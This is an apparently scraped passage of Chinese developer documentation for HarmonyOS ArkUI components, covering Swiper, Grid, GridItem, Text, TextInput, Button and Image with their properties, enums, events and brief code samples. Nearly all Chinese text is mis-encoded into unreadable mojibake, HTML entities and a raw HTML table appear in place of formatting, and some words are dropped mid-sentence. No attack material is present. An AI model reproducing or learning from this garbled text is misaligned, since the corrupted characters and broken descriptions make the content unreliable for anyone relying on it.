è®¾ç½®å¯¼èˆªç‚¹çš„ç›´å¾„ã€‚- mask: è®¾ç½®æ˜¯å¦æ˜¾ç¤ºå¯¼èˆª ç‚¹è’™å±‚æ ·å¼ã€‚- color: è®¾ç½®å¯¼èˆªç‚¹çš„é¢œ è‰²ã€‚- selectedColor: è®¾ç½®é€‰ä¸­çš„å¯¼èˆªç‚¹çš„é¢œè‰²ã€‚ SwiperDisplayModeæšä¸¾è¯´æ˜ åç§° æè¿° Stretch Swiperæ»‘åŠ¨ä¸€é¡µçš„å®½åº¦ä¸ºSwiperç»„ä»¶è‡ªèº«çš„å®½åº¦ã€‚ AutoLinear Swiperæ»‘åŠ¨ä¸€é¡µçš„å®½åº¦ä¸ºå­ç»„ä»¶å®½åº¦ä¸­çš„ å¤§å€¼ã€‚ EdgeEffectæšä¸¾è¯´æ˜ åç§° æè¿° Spring å¼¹æ€§ç‰©ç†åŠ¨æ•ˆï¼Œæ»‘åŠ¨åˆ°è¾¹ç¼˜åå¯ä»¥é€šè¿‡è§¦æ‘¸äº‹ä»¶ç»§ç»­æ»‘åŠ¨ä¸€æ®µè·ç¦»ï¼Œæ¾æ‰‹åå›å¼¹ã€‚ Fade æ»‘åŠ¨åˆ°è¾¹ç¼˜åï¼Œå¯ä»¥é€šè¿‡è§¦æ‘¸äº‹ä»¶ç»§ç»­æ»‘åŠ¨ä¸€æ®µé˜´å½±ï¼Œæ¾æ‰‹åé˜´å½±å›å¼¹ã€‚ None æ»‘åŠ¨åˆ°è¾¹ç¼˜åæ— æ•ˆæœã€‚ SwiperControllerSwiperå®¹å™¨ç»„ä»¶çš„æ§åˆ¶å™¨ï¼Œå¯ä»¥å°†æ­¤å¯¹è±¡ç»‘å®šè‡³Swiperç»„ä»¶ï¼Œç„¶åé€šè¿‡å®ƒæ§åˆ¶ç¿»é¡µã€‚ showNext 1showNext(): void ç¿»è‡³ä¸‹ä¸€é¡µã€‚showPrevious 1showPrevious(): void ç¿»è‡³ä¸Šä¸€é¡µã€‚finishAnimation 1finishAnimation(callback?: () =&gt; void): void åœæ­¢æ’­æ”¾åŠ¨ç”»ã€‚å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡«é¡¹ å‚æ•°æè¿° callback () =&gt; void æ˜¯ åŠ¨ç”»ç»“æŸçš„å›è°ƒã€‚ äº‹ä»¶onChange 1onChange(event: (index: number) =&gt; void) å½“å‰æ˜¾ç¤ºçš„ç»„ä»¶ç´¢å¼•å˜åŒ–æ—¶è§¦å‘è¯¥äº‹ä»¶ï¼Œè¿”å›å€¼ä¸ºå½“å‰æ˜¾ç¤ºçš„å­ç»„ä»¶çš„ç´¢å¼•å€¼ã€‚ å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡«é¡¹ å‚æ•°æè¿° index number æ˜¯ å½“å‰æ˜¾ç¤ºå…ƒç´ çš„ç´¢å¼•ã€‚ Gridç½‘æ ¼å®¹å™¨ï¼Œç”±â€œè¡Œâ€å’Œâ€œåˆ—â€åˆ†å‰²çš„å•å…ƒæ ¼æ‰€ç»„æˆï¼Œé€šè¿‡æŒ‡å®šâ€œé¡¹ç›®â€æ‰€åœ¨çš„å•å…ƒæ ¼åšå‡ºå„ç§å„æ ·çš„å¸ƒå±€ã€‚ 1Grid(scroller?: Scroller) å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« å‚æ•°æè¿° scroller Scroller å¦ å¯æ»šåŠ¨ç»„ä»¶çš„æ§åˆ¶å™¨ã€‚ç”¨äºä¸å¯æ»šåŠ¨ç»„ä»¶è¿›è¡Œç»‘å®šã€‚ å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° columnsTemplate string è®¾ç½®å½“å‰ç½‘æ ¼å¸ƒå±€åˆ—çš„æ•°é‡ï¼Œä¸è®¾ç½®æ—¶é»˜è®¤1åˆ—ã€‚ä¾‹ å¦‚, '1fr 1fr 2fr' æ˜¯å°†çˆ¶ç»„ä»¶åˆ†3åˆ—ï¼Œå°†çˆ¶ç»„ä»¶å…è®¸çš„å®½åˆ†ä¸º4ç­‰ä»½ï¼Œç¬¬ä¸€åˆ—å 1ä»½ï¼Œç¬¬äºŒåˆ—å 1ä»½ï¼Œç¬¬ä¸‰åˆ—å 2 ä»½ã€‚é»˜è®¤å€¼ï¼š'1fr' rowsTemplate string è®¾ç½®å½“å‰ç½‘æ ¼å¸ƒå±€è¡Œçš„æ•°é‡ï¼Œä¸è®¾ç½®æ—¶é»˜è®¤1è¡Œã€‚ä¾‹å¦‚, '1fr 1fr 2fr'æ˜¯å°†çˆ¶ç»„ä»¶åˆ†ä¸‰è¡Œï¼Œå°†çˆ¶ç»„ä»¶å…è®¸çš„ é«˜åˆ†ä¸º4ç­‰ä»½ï¼Œç¬¬ä¸€è¡Œå 1ä»½ï¼Œç¬¬äºŒè¡Œå ä¸€ä»½ï¼Œç¬¬ä¸‰è¡Œå 2ä»½ã€‚é»˜è®¤å€¼ï¼š'1fr' columnsGap Length è®¾ç½®åˆ—ä¸åˆ—çš„é—´è·ã€‚é»˜è®¤å€¼ï¼š0 rowsGap Length è®¾ç½®è¡Œä¸è¡Œçš„é—´è·ã€‚é»˜è®¤å€¼ï¼š0 scrollBar BarState è®¾ç½®æ»šåŠ¨æ¡çŠ¶æ€ã€‚é»˜è®¤å€¼ï¼šBarState.Off scrollBarColor string | number | Color è®¾ç½®æ»šåŠ¨æ¡çš„é¢œè‰²ã€‚ scrollBarWidth string | number è®¾ç½®æ»šåŠ¨æ¡çš„å®½åº¦ã€‚ cachedCount number è®¾ç½®é¢„åŠ è½½çš„GridItemçš„æ•°é‡ã€‚å…·ä½“ä½¿ç”¨å¯å‚è€ƒå‡å°‘åº”ç”¨ç™½å—è¯´æ˜ã€‚é»˜è®¤å€¼ï¼š1 editMode 8+ boolean æ˜¯å¦è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œè¿›å…¥ç¼–è¾‘æ¨¡å¼å¯ä»¥æ‹–æ‹½Gridç»„ä»¶å†…éƒ¨GridItemã€‚é»˜è®¤å€¼ï¼šfalse layoutDirection 8+ GridDirection è®¾ç½®å¸ƒå±€çš„ä¸»è½´æ–¹å‘ã€‚é»˜è®¤å€¼ï¼šGridDirection.Row maxCount 8+ number å½“layoutDirectionæ˜¯Row/RowReverseæ—¶ï¼Œè¡¨ç¤ºå¯æ˜¾ç¤ºçš„ å¤§è¡Œæ•°å½“layoutDirectionæ˜¯ Column/ColumnReverseæ—¶ï¼Œè¡¨ç¤ºå¯æ˜¾ç¤ºçš„ å¤§åˆ— æ•°ã€‚é»˜è®¤å€¼ï¼š1 minCount 8+ number å½“layoutDirectionæ˜¯Row/RowReverseæ—¶ï¼Œè¡¨ç¤ºå¯æ˜¾ç¤ºçš„ å°è¡Œæ•°ã€‚å½“layoutDirectionæ˜¯ Column/ColumnReverseæ—¶ï¼Œè¡¨ç¤ºå¯æ˜¾ç¤ºçš„ å°åˆ— æ•°ã€‚é»˜è®¤å€¼ï¼š1 cellLength 8+ number å½“layoutDirectionæ˜¯Row/RowReverseæ—¶ï¼Œè¡¨ç¤ºä¸€è¡Œçš„é«˜åº¦ã€‚å½“layoutDirectionæ˜¯ Column/ColumnReverseæ—¶ï¼Œè¡¨ç¤ºä¸€åˆ—çš„å®½åº¦ã€‚é»˜ è®¤å€¼ï¼š0 multiSelectable 8+ boolean æ˜¯å¦å¼€å¯é¼ æ ‡æ¡†é€‰ã€‚- falseï¼šå…³é—­æ¡†é€‰ã€‚- trueï¼šå¼€å¯æ¡†é€‰ã€‚é»˜è®¤å€¼ï¼šfalse supportAnimation 8+ boolean æ˜¯å¦æ”¯æŒåŠ¨ç”»ã€‚é»˜è®¤å€¼ï¼šfalse GridDirectionæšä¸¾è¯´æ˜8+ åç§° æè¿° Row ä¸»è½´å¸ƒå±€æ–¹å‘æ²¿æ°´å¹³æ–¹å‘å¸ƒå±€ï¼Œå³è‡ªå·¦å¾€å³å…ˆå¡«æ»¡ä¸€è¡Œï¼Œå†å»å¡«ä¸‹ä¸€è¡Œã€‚ Column ä¸»è½´å¸ƒå±€æ–¹å‘æ²¿å‚ç›´æ–¹å‘å¸ƒå±€ï¼Œå³è‡ªä¸Šå¾€ä¸‹å…ˆå¡«æ»¡ä¸€åˆ—ï¼Œå†å»å¡«ä¸‹ä¸€åˆ—ã€‚ RowReverse ä¸»è½´å¸ƒå±€æ–¹å‘æ²¿æ°´å¹³æ–¹å‘åå‘å¸ƒå±€ï¼Œå³è‡ªå³å¾€å·¦å…ˆå¡«æ»¡ä¸€è¡Œï¼Œå†å»å¡«ä¸‹ä¸€è¡Œã€‚ ColumnReverse ä¸»è½´å¸ƒå±€æ–¹å‘æ²¿å‚ç›´æ–¹å‘åå‘å¸ƒå±€ï¼Œå³è‡ªä¸‹å¾€ä¸Šå…ˆå¡«æ»¡ä¸€åˆ—ï¼Œå†å»å¡«ä¸‹ä¸€åˆ—ã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onScrollIndex(event: (first: number) =&gt; void) å½“å‰ç½‘æ ¼æ˜¾ç¤ºçš„èµ·å§‹ä½ç½®itemå‘ç”Ÿå˜åŒ– æ—¶è§¦å‘ã€‚- first: å½“å‰æ˜¾ç¤ºçš„ç½‘æ ¼èµ·å§‹ä½ç½®çš„ç´¢å¼•å€¼ã€‚ onItemDragStart(event: (event: ItemDragInfo, itemIndex: number) =&gt; (() =&gt; any) | void) å¼€å§‹æ‹–æ‹½ç½‘æ ¼å…ƒç´ æ—¶è§¦å‘ã€‚ onItemDragEnter(event: (event: ItemDragInfo) =&gt; void) æ‹–æ‹½è¿›å…¥ç½‘æ ¼å…ƒç´ èŒƒå›´å†…æ—¶è§¦å‘ã€‚ onItemDragMove(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number) =&gt; void) æ‹–æ‹½åœ¨ç½‘æ ¼å…ƒç´ èŒƒå›´å†…ç§»åŠ¨æ—¶è§¦å‘ã€‚ onItemDragLeave(event: (event: ItemDragInfo, itemIndex: number) =&gt; void) æ‹–æ‹½ç¦»å¼€ç½‘æ ¼å…ƒç´ æ—¶è§¦å‘ã€‚ onItemDrop(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number, isSuccess: boolean) =&gt; void) ç»‘å®šè¯¥äº‹ä»¶çš„ç½‘æ ¼å…ƒç´ å¯ä½œä¸ºæ‹–æ‹½é‡Šæ”¾ç›®æ ‡ï¼Œå½“åœ¨ç½‘æ ¼å…ƒç´ å†…åœæ­¢æ‹–æ‹½æ—¶è§¦å‘ã€‚ ItemDragInfoå¯¹è±¡è¯´æ˜ åç§° ç±»å‹ æè¿° x number å½“å‰æ‹–æ‹½ç‚¹çš„xåæ ‡ã€‚ y number å½“å‰æ‹–æ‹½ç‚¹çš„yåæ ‡ã€‚ GridItemç½‘æ ¼å®¹å™¨ä¸­å•é¡¹å†…å®¹å®¹å™¨ã€‚ 1GridItem() å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° rowStart number æŒ‡å®šå½“å‰å…ƒç´ èµ·å§‹è¡Œå·ã€‚ rowEnd number æŒ‡å®šå½“å‰å…ƒç´ ç»ˆç‚¹è¡Œå·ã€‚ columnStart number æŒ‡å®šå½“å‰å…ƒç´ èµ·å§‹åˆ—å·ã€‚ columnEnd number æŒ‡å®šå½“å‰å…ƒç´ ç»ˆç‚¹åˆ—å·ã€‚ forceRebuild boolean è®¾ç½®åœ¨è§¦å‘ç»„ä»¶buildæ—¶æ˜¯å¦é‡æ–°åˆ›å»ºæ­¤èŠ‚ç‚¹ã€‚é»˜è®¤å€¼ï¼šfalse selectable8+ boolean å½“å‰GridItemå…ƒç´ æ˜¯å¦å¯ä»¥è¢«é¼ æ ‡æ¡†é€‰ã€‚é»˜è®¤å€¼ï¼štrueè¯´æ˜ï¼šå¤–å±‚ Gridå®¹å™¨çš„é¼ æ ‡æ¡†é€‰å¼€å¯æ—¶ï¼ŒGridItemçš„æ¡†é€‰æ‰ç”Ÿæ•ˆã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onSelect(event: (isSelected: boolean) =&gt; void)8+ GridItemå…ƒç´ è¢«é¼ æ ‡æ¡†é€‰çš„çŠ¶æ€æ”¹å˜æ—¶è§¦å‘å›è°ƒã€‚isSelectedï¼šè¿›å…¥é¼ æ ‡æ¡†é€‰èŒƒå›´å³è¢«é€‰ä¸­ï¼Œè¿”å›trueï¼›ç§»å‡ºé¼ æ ‡æ¡†é€‰èŒƒå›´å³æœªè¢«é€‰ä¸­ï¼Œè¿”å› falseã€‚ 123456789101112131415161718192021222324Grid() &#123; // ç¬¬ä¸€è¡Œ GridItem() &#123; Text(&#x27;1&#x27;) &#125; .height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;2&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;3&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;4&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) GridItem() &#123; Text(&#x27;5&#x27;) &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) // GridItem() &#123; // Text(&#x27;6&#x27;) // &#125;.height(&#x27;20%&#x27;).width(&#x27;20%&#x27;) &#125;.height(&#x27;30%&#x27;).width(&#x27;30%&#x27;) â€‹ åŸºç¡€ç»„ä»¶ Textæ˜¾ç¤ºä¸€æ®µæ–‡æœ¬çš„ç»„ä»¶ã€‚å¯ä»¥åŒ…å«Spanå­ç»„ä»¶ã€‚ 12345678Text(content?: string | Resource)Text(this.message) .fontSize(20) .fontWeight(FontWeight.Bold) å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° textAlign TextAlign è®¾ç½®å¤šè¡Œæ–‡æœ¬çš„æ–‡æœ¬å¯¹é½æ–¹å¼ã€‚é»˜è®¤å€¼ï¼š TextAlign.Start textOverflow {overflow: TextOverflow} è®¾ç½®æ–‡æœ¬è¶…é•¿æ—¶çš„æ˜¾ç¤ºæ–¹å¼ã€‚é»˜è®¤å€¼ï¼š {overflow: TextOverflow.Clip}è¯´æ˜ï¼šæ–‡æœ¬æˆªæ–­æ˜¯æŒ‰å­—æˆªæ–­ã€‚ä¾‹å¦‚ï¼Œè‹±æ–‡ä»¥å•è¯ä¸º å°å• ä½è¿›è¡Œæˆªæ–­ï¼Œè‹¥éœ€è¦ä»¥å­—æ¯ä¸ºå•ä½è¿›è¡Œæˆªæ–­ï¼Œå¯åœ¨å­—æ¯é—´æ·»åŠ é›¶å®½ç©ºæ ¼ï¼š\\u200Bã€‚ maxLines number è®¾ç½®æ–‡æœ¬çš„ å¤§è¡Œæ•°ã€‚é»˜è®¤å€¼ï¼šInfinity lineHeight string | number | Resource è®¾ç½®æ–‡æœ¬çš„æ–‡æœ¬è¡Œé«˜ï¼Œè®¾ç½®å€¼ä¸å¤§äº0æ—¶ï¼Œä¸é™åˆ¶æ–‡æœ¬è¡Œé«˜ï¼Œè‡ªé€‚åº”å­—ä½“å¤§å°ï¼ŒLengthä¸º numberç±»å‹æ—¶å•ä½ä¸ºfpã€‚ decoration {type: TextDecorationType,color?: ResourceColor} è®¾ç½®æ–‡æœ¬è£…é¥°çº¿æ ·å¼åŠå…¶é¢œè‰²ã€‚é»˜è®¤å€¼ï¼š {type: TextDecorationType.None,colorï¼š Color.Black} baselineOffset number | string è®¾ç½®æ–‡æœ¬åŸºçº¿çš„åç§»é‡ã€‚ letterSpacing number | string è®¾ç½®æ–‡æœ¬å­—ç¬¦é—´è·ã€‚ minFontSize number | string | Resource è®¾ç½®æ–‡æœ¬ å°æ˜¾ç¤ºå­—å·ã€‚ maxFontSize number | string | Resource è®¾ç½®æ–‡æœ¬ å¤§æ˜¾ç¤ºå­—å·ã€‚ textCase TextCase è®¾ç½®æ–‡æœ¬å¤§å°å†™ã€‚é»˜è®¤å€¼ï¼š TextCase.Normal TextInputå•è¡Œæ–‡æœ¬è¾“å…¥æ¡†ç»„ä»¶ã€‚ å­ç»„ä»¶ æ—  1234TextInput(value?:&#123;placeholder?: ResourceStr, text?: ResourceStr, controller?: TextInputController&#125;) å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« å‚æ•°æè¿° placeholder ResourceStr å¦ æ— è¾“å…¥æ—¶çš„æç¤ºæ–‡æœ¬ã€‚ text ResourceStr å¦ è®¾ç½®è¾“å…¥æ¡†å½“å‰çš„æ–‡æœ¬å†…å®¹ã€‚ controller8+ TextInputController å¦ è®¾ç½®TextInputæ§åˆ¶å™¨ã€‚ å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° type InputType è®¾ç½®è¾“å…¥æ¡†ç±»å‹ã€‚é»˜è®¤å€¼ï¼šInputType.Normal placeholderColor ResourceColor è®¾ç½®placeholderé¢œè‰²ã€‚ placeholderFont Font è®¾ç½®placeholderæ–‡æœ¬æ ·å¼ï¼š- size: è®¾ç½®æ–‡æœ¬å°ºå¯¸ï¼ŒLengthä¸ºnumberç±»å‹æ—¶ï¼Œä½¿ç”¨fpå•ä½ã€‚weight: è®¾ç½®æ–‡æœ¬çš„å­—ä½“ç²—ç»†ï¼Œnumberç±»å‹å–å€¼ [100, 900]ï¼Œå–å€¼é—´éš”ä¸º100ï¼Œé»˜è®¤ä¸º400ï¼Œå–å€¼è¶Šå¤§ï¼Œå­—ä½“è¶Šç²—ã€‚- family: è®¾ç½®æ–‡æœ¬çš„å­—ä½“åˆ—è¡¨ã€‚ä½¿ ç”¨å¤šä¸ªå­—ä½“ï¼Œä½¿ç”¨','è¿›è¡Œåˆ†å‰²ï¼Œä¼˜å…ˆçº§æŒ‰é¡ºåºç”Ÿ æ•ˆã€‚ä¾‹å¦‚ï¼š'Arial, sans-serif'ã€‚- style: è®¾ç½®æ–‡æœ¬çš„å­—ä½“æ ·å¼ã€‚ enterKeyType EnterKeyType è®¾ç½®è¾“å…¥æ³•å›è½¦é”®ç±»å‹ã€‚é»˜è®¤å€¼ï¼š EnterKeyType.Done caretColor ResourceColor è®¾ç½®è¾“å…¥æ¡†å…‰æ ‡é¢œè‰²ã€‚ maxLength number è®¾ç½®æ–‡æœ¬çš„ å¤§è¾“å…¥å­—ç¬¦æ•°ã€‚ inputFilter8+ {value: ResourceStr,error?: (value: string) =&gt; void} æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ»¡è¶³è¡¨è¾¾å¼çš„è¾“å…¥å…è®¸æ˜¾ç¤ºï¼Œä¸æ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼çš„è¾“å…¥è¢«å¿½ç•¥ã€‚ä»…æ”¯æŒå•ä¸ªå­—ç¬¦åŒ¹é…ï¼Œä¸æ”¯æŒå­—ç¬¦ä¸²åŒ¹é…ã€‚ä¾‹å¦‚ï¼š^(?=.\\d)(?=.[a-z])(?=.* [A-Z]).{8,10}$ï¼Œ8åˆ°10ä½çš„å¼ºå¯†ç ä¸æ”¯æŒè¿‡æ»¤ã€‚valueï¼šè®¾ç½®æ­£åˆ™è¡¨è¾¾å¼ã€‚- errorï¼šæ­£åˆ™åŒ¹é…å¤±è´¥æ—¶ï¼Œè¿”å›è¢«å¿½ç•¥çš„å†…å®¹ã€‚ EnterKeyTypeæšä¸¾è¯´æ˜ åç§° æè¿° Go æ˜¾ç¤ºGoæ–‡æœ¬ã€‚ Search æ˜¾ç¤ºä¸ºæœç´¢æ ·å¼ã€‚ Send æ˜¾ç¤ºä¸ºå‘é€æ ·å¼ã€‚ Next æ˜¾ç¤ºä¸ºä¸‹ä¸€ä¸ªæ ·å¼ã€‚ Done æ ‡å‡†æ ·å¼ã€‚ InputTypeæšä¸¾è¯´æ˜ åç§° æè¿° Normal åŸºæœ¬è¾“å…¥æ¨¡å¼ã€‚ Password å¯†ç è¾“å…¥æ¨¡å¼ã€‚ Email e-mailåœ°å€è¾“å…¥æ¨¡å¼ã€‚ Number çº¯æ•°å­—è¾“å…¥æ¨¡å¼ã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onChange(callback: (value: string) =&gt; void) è¾“å…¥å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè§¦å‘å›è°ƒã€‚ onSubmit(callback: (enterKey: EnterKeyType) =&gt; void) å›è½¦é”®æˆ–è€…è½¯é”®ç›˜å›è½¦é”®è§¦å‘è¯¥å›è°ƒï¼Œå‚æ•°ä¸ºå½“å‰è½¯é”®ç›˜å›è½¦é”®ç±»å‹ã€‚ onEditChanged(callback: (isEditing: boolean) =&gt; void)(deprecated) è¾“å…¥çŠ¶æ€å˜åŒ–æ—¶ï¼Œè§¦å‘å›è°ƒã€‚ onEditChange(callback: (isEditing: boolean) =&gt; void) 8+ è¾“å…¥çŠ¶æ€å˜åŒ–æ—¶ï¼Œè§¦å‘å›è°ƒã€‚ onCopy8+(callback:(value: string) =&gt; void) é•¿æŒ‰è¾“å…¥æ¡†å†…éƒ¨åŒºåŸŸå¼¹å‡ºå‰ªè´´æ¿åï¼Œç‚¹å‡»å‰ªåˆ‡æ¿å¤åˆ¶æŒ‰é’®ï¼Œè§¦å‘å›è°ƒã€‚valueï¼šå¤åˆ¶çš„æ–‡æœ¬å†…å®¹ã€‚ onCut8+(callback:(value: string) =&gt; void) é•¿æŒ‰è¾“å…¥æ¡†å†…éƒ¨åŒºåŸŸå¼¹å‡ºå‰ªè´´æ¿åï¼Œç‚¹å‡»å‰ªåˆ‡æ¿å‰ªåˆ‡æŒ‰é’®ï¼Œè§¦å‘å›è°ƒã€‚valueï¼šå‰ªåˆ‡çš„æ–‡æœ¬å†…å®¹ã€‚ onPaste8+(callback:(value: string) =&gt; void) é•¿æŒ‰è¾“å…¥æ¡†å†…éƒ¨åŒºåŸŸå¼¹å‡ºå‰ªè´´æ¿åï¼Œç‚¹å‡»å‰ªåˆ‡æ¿ç²˜è´´æŒ‰é’®ï¼Œè§¦å‘å›è°ƒã€‚valueï¼šç²˜è´´çš„æ–‡æœ¬å†…å®¹ã€‚ 1234TextInput() .padding(&#123;top:&#x27;5vp&#x27;&#125;) .margin(&#123;top:&#x27;5vp&#x27;&#125;) â€‹TextInputController 8+ TextInputç»„ä»¶çš„æ§åˆ¶å™¨ã€‚ å¯¼å…¥å¯¹è±¡ 123456controller: TextInputController = new TextInputController() caretPosition caretPosition(value: number): void è®¾ç½®å…‰æ ‡ç§»åŠ¨åˆ°æŒ‡å®šä½ç½®ã€‚å‚æ•°ï¼š 1&lt;div class=&quot;table-box&quot;&gt;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; style=&quot;margin-left:.3pt;width:444.2pt;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:45.1pt;&quot;&gt; &lt;p style=&quot;margin-left:.1pt;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;å‚æ•°å&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:57.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0cm;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;å‚æ•°ç±»å‹&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:36pt;&quot;&gt; &lt;p style=&quot;margin-left:0cm;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;å¿…å¡«&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;background-color:#f8f8f8;border-color:#dfe2e5;width:306.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;&lt;strong&gt;å‚æ•°æè¿°&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;border-color:#dfe2e5;width:45.1pt;&quot;&gt; &lt;p style=&quot;margin-left:0cm;text-align:center;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;value&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;width:57.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;number&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;width:36pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;æ˜¯&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;td style=&quot;width:306.05pt;&quot;&gt; &lt;p style=&quot;margin-left:0;&quot;&gt;&lt;span style=&quot;color:#333333;&quot;&gt;è®¾ç½®è¾“å…¥å…‰æ ‡çš„ä½ç½®ã€‚valueï¼šä»å­—ç¬¦ä¸²å¼€å§‹åˆ°å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å­—ç¬¦é•¿åº¦ã€‚&lt;/span&gt;&lt;/p&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt; ButtonæŒ‰é’®ç»„ä»¶ï¼Œå¯å¿«é€Ÿåˆ›å»ºä¸åŒæ ·å¼çš„æŒ‰é’®ã€‚ æ¥å£ æ–¹æ³•1ï¼š 1Button(options?: &#123;type?: ButtonType, stateEffect?: boolean&#125;) å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« å‚æ•°æè¿° type ButtonType å¦ æè¿°æŒ‰é’®æ˜¾ç¤ºæ ·å¼ã€‚é»˜è®¤å€¼ï¼šButtonType.Capsule stateEffect boolean å¦ æŒ‰é’®æŒ‰ä¸‹æ—¶æ˜¯å¦å¼€å¯æŒ‰å‹æ€æ˜¾ç¤ºæ•ˆæœï¼Œå½“è®¾ç½®ä¸ºfalseæ—¶ï¼ŒæŒ‰å‹æ•ˆæœå…³é—­ã€‚ã€‚é»˜è®¤å€¼ï¼štrue æ–¹æ³• 1Button(label?: ResourceStr, options?: &#123; type?: ButtonType, stateEffect?: boolean &#125;) ä½¿ç”¨æ–‡æœ¬å†…å®¹åˆ›å»ºç›¸åº”çš„æŒ‰é’®ç»„ä»¶ï¼Œæ­¤æ—¶Buttonæ— æ³•åŒ…å«å­ç»„ä»¶ã€‚å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« å‚æ•°æè¿° label ResourceStr å¦ æŒ‰é’®æ–‡æœ¬å†…å®¹ã€‚ options {type?: ButtonType,stateEffect?: boolean} å¦ è§æ–¹æ³•1å‚æ•°è¯´æ˜ã€‚ å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° type ButtonType è®¾ç½®Buttonæ ·å¼ã€‚é»˜è®¤å€¼ï¼šButtonType.Capsule stateEffect boolean æŒ‰é’®æŒ‰ä¸‹æ—¶æ˜¯å¦å¼€å¯æŒ‰å‹æ€æ˜¾ç¤ºæ•ˆæœï¼Œå½“è®¾ç½®ä¸ºfalseæ—¶ï¼ŒæŒ‰å‹æ•ˆæœå…³é—­ã€‚é»˜è®¤å€¼ï¼štrue ButtonTypeæšä¸¾è¯´æ˜ åç§° æè¿° Capsule èƒ¶å›Šå‹æŒ‰é’®ï¼ˆåœ†è§’é»˜è®¤ä¸ºé«˜åº¦çš„ä¸€åŠï¼‰ã€‚ Circle åœ†å½¢æŒ‰é’®ã€‚ Normal æ™®é€šæŒ‰é’®ï¼ˆé»˜è®¤ä¸å¸¦åœ†è§’ï¼‰ã€‚ 12345678Button() &#123; Text(&#x27;ç‚¹å‡»&#x27;) &#125; .width(&#x27;100fp&#x27;) .backgroundColor(Color.Gray) .padding(&#123;top:&#x27;5vp&#x27;&#125;) .margin(&#123;top:&#x27;5vp&#x27;&#125;) Imageå›¾ç‰‡ç»„ä»¶ï¼Œæ”¯æŒæœ¬åœ°å›¾ç‰‡å’Œç½‘ç»œå›¾ç‰‡çš„æ¸²æŸ“å±•ç¤ºã€‚ 1Image(src: string | PixelMap | Resource) å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« é»˜è®¤å€¼ å‚æ•°æè¿° src string| PixelMap| Resource æ˜¯ - å›¾ç‰‡çš„æ•°æ®æºï¼Œæ”¯æŒæœ¬åœ°å›¾ç‰‡å’Œç½‘ç»œå›¾ç‰‡ã€‚å½“ä½¿ç”¨ç›¸å¯¹è·¯å¾„ å¼•ç”¨å›¾ç‰‡èµ„æºæ—¶ï¼Œä¾‹å¦‚Image(\"common/test.jpg\")ï¼Œä¸æ”¯æŒè¯¥Imageç»„ä»¶è¢«è·¨åŒ…/è·¨æ¨¡å—è°ƒç”¨ï¼Œå»ºè®®ä½¿ç”¨$ræ–¹å¼æ¥ç®¡ç†éœ€å…¨å±€ä½¿ç”¨çš„å›¾ç‰‡èµ„æºã€‚- æ”¯æŒçš„å›¾ç‰‡æ ¼å¼åŒ…æ‹¬pngã€jpgã€ bmpã€svgå’Œgifã€‚- æ”¯æŒBase64å­—ç¬¦ä¸²ã€‚æ ¼å¼ data:image/[png|jpeg|bmp|webp];base64,[base64 data], å…¶ä¸­[base64 data]ä¸ºBase64å­—ç¬¦ä¸²æ•°æ®ã€‚- æ”¯æŒ dataability://è·¯å¾„å‰ç¼€çš„å­—ç¬¦ä¸²ï¼Œç”¨äºè®¿é—®é€šè¿‡data ability æä¾›çš„å›¾ç‰‡è·¯å¾„ã€‚ å±æ€§ åç§° 